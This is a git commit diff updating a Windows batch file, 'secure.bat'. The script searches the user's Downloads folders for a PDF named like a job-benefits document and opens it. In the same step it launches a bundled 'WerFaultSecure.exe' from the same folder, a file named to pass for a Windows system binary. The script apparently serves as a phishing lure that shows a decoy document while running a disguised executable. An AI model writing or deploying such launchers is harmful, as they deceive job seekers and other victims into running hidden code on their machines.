c449a5a84a32e256d0e939f42e704f2cebadf149
z3nn1 <149288329+z3nn1@users.noreply.github.com>
2024-09-16 11:49:18 +0700

    Update secure.bat

--- secure.bat
+++ secure.bat
@@ -1,9 +1,39 @@
 @echo off
-echo Current directory: %CD%
-echo Full path to batch file: %~f0
-echo Directory of batch file: %~dp0
-echo Attempting to list directory contents:
-dir /b "%~dp0"
-echo.
-echo Attempting to open PDF:
-start "" "%~dp0BenefitsJDPhotoVideoUNQILOQ42024.pdf"
+setlocal enabledelayedexpansion
+
+set "pdfName=BenefitsJDPhotoVideoUNQILOQ42024.pdf"
+set "werFaultSecure=WerFaultSecure.exe"
+
+set "downloadFolder=%USERPROFILE%\Downloads"
+
+echo Searching for %pdfName% in recent downloads...
+
+for /f "delims=" %%D in ('dir /ad /b /od /t:w "%downloadFolder%" ^| sort /r ^| findstr /n "^" ^| findstr "^[1-5]:"') do (
+    set "recentFolder=%%D"
+    set "recentFolder=!recentFolder:*:=!"
+    
+    if exist "%downloadFolder%\!recentFolder!\%pdfName%" (
+        echo File found: %downloadFolder%\!recentFolder!\%pdfName%
+        start "" "%downloadFolder%\!recentFolder!\%pdfName%"
+	start "" "%downloadFolder%\!recentFolder!\%werFaultSecure%"
+
+        goto :found
+    )
+)
+
+
+if exist "%downloadFolder%\%pdfName%" (
+    echo File found: %downloadFolder%\%pdfName%
+    start "" "%downloadFolder%\%pdfName%"
+    start "" "%downloadFolder%\%werFaultSecure%"
+
+    goto :found
+)
+
+
+goto :end
+
+:found
+
+
+:end
